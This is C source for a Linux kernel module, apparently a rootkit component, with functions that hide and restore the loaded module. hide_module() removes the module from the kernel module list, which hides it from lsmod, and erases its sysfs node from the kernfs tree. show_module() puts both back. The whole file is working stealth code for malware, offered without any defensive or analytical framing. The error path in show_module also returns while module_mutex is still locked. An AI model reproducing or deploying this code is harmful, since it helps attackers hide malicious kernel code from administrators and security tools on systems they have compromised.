#include <linux/fs.h>
#include <linux/module.h>

#include "hide.h"

static bool module_hidden = false;
static struct list_head *list_of_modules;

// Derived from fs/kernfs/dir.c
static int kernfs_node_cmp(struct kernfs_node *left, struct kernfs_node *right) {
    if (left->hash < right->hash) {
        return -1;
    } else if (left->hash > right->hash) {
        return 1;
    } else if (left->ns < right->ns) {
        return -1;
    } else if (left->ns > right->ns) {
        return 1;
    }

    return strcmp(left->name, right->name);
}

// Derived from Documentation/rbtree.txt
static int rb_insert(struct kernfs_node *node) {
    struct rb_node **new = &node->parent->dir.children.rb_node;
    struct rb_node *parent = NULL;
    struct kernfs_node *this;
    int result;

    while (*new) {
        this = rb_entry(*new, struct kernfs_node, rb);
        result = kernfs_node_cmp(this, node);
        parent = *new;

        if (result < 0) {
            new = &((*new)->rb_left);
        } else if (result > 0) {
            new = &((*new)->rb_right);
        } else {
            return -1;
        }
    }

    rb_link_node(&node->rb, parent, new);
    rb_insert_color(&node->rb, &node->parent->dir.children);
    return 0;
}

int hide_module(void) {
    struct kernfs_node *node;

    if (mutex_lock_interruptible(&module_mutex) != 0) {
        return -EINTR;
    }

    if (!module_hidden) {
        // Keep a backup reference to the list.
        list_of_modules = THIS_MODULE->list.prev;

        // Hide procfs entry (affects lsmod).
        list_del_init(&THIS_MODULE->list);

        // Hide directory in sysfs.
        node = THIS_MODULE->mkobj.kobj.sd;
        rb_erase(&node->rb, &node->parent->dir.children);
        node->rb.__rb_parent_color = (unsigned long) &node->rb;

        module_hidden = true;
    }

    mutex_unlock(&module_mutex);
    return 0;
}

int show_module(void) {
    if (mutex_lock_interruptible(&module_mutex)) {
        return -EINTR;
    }

    if (module_hidden) {
        list_add(&THIS_MODULE->list, list_of_modules);

        if (rb_insert(THIS_MODULE->mkobj.kobj.sd) < 0) {
            // The rb node is already present: should not happen.
            return -EEXIST;
        }
        module_hidden = false;
    }

    mutex_unlock(&module_mutex);
    return 0;
}
